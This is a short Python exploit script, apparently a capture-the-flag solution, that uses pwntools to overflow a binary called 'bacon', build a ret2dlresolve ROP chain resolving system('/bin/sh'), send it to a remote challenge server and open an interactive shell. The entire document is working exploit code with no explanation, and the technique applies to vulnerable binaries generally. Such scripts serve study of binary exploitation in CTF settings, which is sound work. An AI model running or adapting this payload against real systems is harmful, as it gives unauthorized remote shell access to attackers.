from pwn import *

context.log_level = "DEBUG"

e = ELF("./bacon")
rop = ROP(e)

dlresolve = Ret2dlresolvePayload(e, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

payload = fit({0x40C: raw_rop, 0x42C: dlresolve.payload})

#p = process("./bacon")
p = remote("jh2i.com", 50032)

p.send(payload)
p.interactive()
